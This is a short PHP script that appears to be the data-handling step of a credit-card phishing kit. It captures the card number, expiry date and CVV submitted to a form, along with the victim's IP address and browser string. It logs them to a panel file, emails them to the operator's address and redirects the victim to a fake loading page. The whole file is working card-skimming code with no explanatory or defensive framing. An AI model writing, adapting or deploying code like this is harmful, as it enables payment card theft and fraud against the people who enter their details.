<?php
session_start();
error_reporting(0);
require_once 'os.php'; 
$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];

$ccn = $_SESSION['ccn'] = $_POST['ccn'];
$exp = $_SESSION['exp'] = $_POST['exp'];
$cvv = $_SESSION['cvv'] = $_POST['cvv'];

$message = '
💸 [CC] 💸
<br>
Credit/Debit Card Number     : '.$ccn.'  
<br>
Expiration date              : '.$exp.' 
<br>
CVV                          : '.$cvv.' 
<br>
💻 [Info] 💻
<br>
IP Address     : '.$_SERVER["REMOTE_ADDR"].' 
<br>
Country     : '.$country.' 
<br>
Browser        : '.$browserTy_Version.' 
<br> 
Time           : '.$InfoDATE.' 
<br>
💸 [CC] 💸
';

$ff = fopen("../Panel.php", "a");fwrite($ff, $message);
require_once '../config.php';
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Standard CC 💸 [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: MRZ" . "\r\n";
mail($yourmail, $subject, $message, $headers);
header("Location: ../app/loading6.php");
